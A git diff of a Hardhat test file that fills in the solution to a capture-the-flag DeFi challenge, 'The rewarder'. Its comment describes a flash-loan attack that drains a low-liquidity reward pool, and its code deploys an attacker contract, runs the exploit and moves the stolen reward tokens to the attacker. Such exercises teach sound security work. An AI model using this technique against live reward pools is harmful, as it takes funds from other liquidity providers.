@@ -65,7 +65,25 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT
+            The vulnerability here is caused by the low liquidity in the reward pool contract.
+            This enables an attacker to make a flash loan and mint a large amount of reward tokens at the expense of the other LP provides.
+        */
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const AttackerContractFactory = await ethers.getContractFactory('RewarderExploit', attacker);
+        this.attackerContract = await AttackerContractFactory.deploy(
+            attacker.address, 
+            this.flashLoanPool.address, 
+            this.rewarderPool.address, 
+            this.liquidityToken.address
+        );
+
+        await this.attackerContract.exploit(TOKENS_IN_LENDER_POOL);
+        expect(
+            await this.rewardToken.balanceOf(this.attackerContract.address)
+        ).to.be.gt(ethers.utils.parseEther('99')); // Almost 100 tokens should be minted from the flash loan (1,000,000 * 100 / (1,000,000 + 400) = 1,000,000 / 10,004)
+
+        await this.attackerContract.transferRewards(this.rewardToken.address);
     });
 
     after(async function () {
